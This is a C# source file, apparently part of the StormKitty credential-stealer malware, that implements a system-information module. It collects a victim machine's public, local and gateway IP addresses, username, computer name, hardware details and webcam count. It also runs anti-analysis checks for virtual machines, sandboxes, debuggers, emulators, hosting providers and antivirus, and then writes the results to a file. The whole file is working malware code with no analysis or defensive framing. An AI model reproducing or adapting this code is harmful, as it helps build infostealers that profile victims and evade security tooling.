using StormKitty;
using StormKitty.Implant;

namespace Stealer
{
    internal sealed class SysInfo
    {
        public static void Save(string sSavePath)
        {
            try
            {
                string SystemInfoText = (""
                    + "\n[IP]"
                    + "\nExternal IP: " + SystemInfo.GetPublicIP()
                    + "\nInternal IP: " + SystemInfo.GetLocalIP()
                    + "\nGateway IP: " + SystemInfo.GetDefaultGateway()
                    + "\n"
                    + "\n[Machine]"
                    + "\nUsername: " + SystemInfo.username
                    + "\nCompname: " + SystemInfo.compname
                    + "\nSystem: " + SystemInfo.GetSystemVersion()
                    + "\nCPU: " + SystemInfo.GetCPUName()
                    + "\nGPU: " + SystemInfo.GetGPUName()
                    + "\nRAM: " + SystemInfo.GetRamAmount()
                    + "\nDATE: " + SystemInfo.datenow
                    + "\nSCREEN: " + SystemInfo.ScreenMetrics()
                    + "\nBATTERY: " + SystemInfo.GetBattery()
                    + "\nWEBCAMS COUNT: " + WebcamScreenshot.GetConnectedCamerasCount()
                    + "\n"
                    + "\n[Virtualization]"
                    + "\nVirtualMachine: " + AntiAnalysis.VirtualBox()
                    + "\nSandBoxie: " + AntiAnalysis.SandBox()
                    + "\nEmulator: " + AntiAnalysis.Emulator()
                    + "\nDebugger: " + AntiAnalysis.Debugger()
                    + "\nProcesse: " + AntiAnalysis.Processes()
                    + "\nHosting: " + AntiAnalysis.Hosting()
                    + "\nAntivirus: " + SystemInfo.GetAntivirus()
                    + "\n");
                System.IO.File.WriteAllText(sSavePath, SystemInfoText);
            } catch (System.Exception ex) { Logging.Log("SysInfo >> Failed fetch system info\n" + ex); }
        }
    }
}
